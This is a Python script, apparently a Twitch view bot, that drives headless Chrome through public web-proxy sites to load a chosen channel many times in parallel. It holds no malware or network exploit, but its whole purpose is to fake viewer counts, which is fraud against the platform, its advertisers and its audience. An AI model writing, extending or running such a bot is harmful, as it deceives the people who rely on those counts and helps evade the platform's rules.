import warnings
import os
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from importlib import import_module
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from pystyle import Center, Colors, Colorate

from banner import show_banner

os.environ['TF_DISABLE_DEPLOYMENT_DELEGATES'] = '1'
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'

warnings.filterwarnings("ignore", category=DeprecationWarning)

def load_config():
    try:
        botrc = import_module("botrc")
        BOT_CONFIG = {
            "twitch_username": botrc.twitch_username,
            "total_views": botrc.total_views 
        }
        return BOT_CONFIG
    except (ImportError, AttributeError) as e:
        return {}

BOT_CONFIG = load_config()

def fetch_announcement():
    return "   DJ Stomp 2025\nNo Rights Reserved"

def display_info(message):
    print(Colorate.Vertical(Colors.green_to_blue, Center.XCenter(message)))

def get_config_value(prompt_message, config_key):
    if config_key in BOT_CONFIG:
        return BOT_CONFIG[config_key]
    display_info(prompt_message)
    return input(Colorate.Vertical(Colors.cyan_to_blue, ">> "))

def send_view(proxy_url, twitch_username, drivers):
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--mute-audio')
    chrome_options.add_argument('--disable-gpu')
    chrome_path = r'C:\Program Files\Google\Chrome\Application\chrome.exe'
    chrome_options.binary_location = chrome_path

    driver = webdriver.Chrome(options=chrome_options)
    drivers.append(driver)

    try:
        driver.get(proxy_url)
        driver.execute_script("window.open('{}', '_blank');".format(proxy_url))
        driver.switch_to.window(driver.window_handles[-1])

        text_box = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'url'))
        )
        text_box.send_keys(f'www.twitch.tv/{twitch_username}')
        text_box.send_keys(Keys.RETURN)

        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '.channel-root__player'))
            )
            print(Colorate.Horizontal(Colors.green_to_cyan, f"Channel loaded successfully for proxy: {proxy_url}"))
        except Exception:
            print(Colorate.Horizontal(Colors.red_to_yellow, f"Channel failed to load for proxy: {proxy_url}. Possibly invalid username."))

            if driver.find_elements(By.CSS_SELECTOR, "svg[width='30']"):
                print(Colorate.Horizontal(Colors.red_to_yellow, f"Invalid channel detected for username: {twitch_username}"))
                return False

        print(Colorate.Horizontal(Colors.green_to_cyan, f"Successfully sent view using proxy: {proxy_url}"))
        return True
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_yellow, f"Error with proxy {proxy_url}: {e}"))
        return False

def main():
    os.system("cls" if os.name == "nt" else "clear")
    time.sleep(1)
    show_banner()

    proxy_servers = [
        "https://www.blockaway.net",
        "https://www.croxy.network",
        "https://www.croxy.org",
        "https://www.youtubeunblocked.live",
        "https://www.croxyproxy.net",
    ]

    twitch_username = get_config_value("Choose a Twitch username:", "twitch_username")

    try:
        total_views = int(get_config_value("Specify the number of viewers to send:", "total_views"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_yellow, "Invalid number. Exiting."))
        return

    success_count = 0
    error_count = 0
    drivers = []

    with ThreadPoolExecutor(max_workers=len(proxy_servers)) as executor:
        futures = []
        for i in range(total_views):
            proxy_url = proxy_servers[i % len(proxy_servers)]
            futures.append(executor.submit(send_view, proxy_url, twitch_username, drivers))

        for future in as_completed(futures):
            if future.result():
                success_count += 1
            else:
                error_count += 1

    print(Colorate.Vertical(Colors.green_to_blue, Center.XCenter(f"Operation complete. Success: {success_count}, Errors: {error_count}.")))
    print(Colorate.Vertical(Colors.yellow_to_red, Center.XCenter("Press Enter to exit and close all browser instances...")))
    input()

    for driver in drivers:
        driver.quit()

if __name__ == '__main__':
    main()
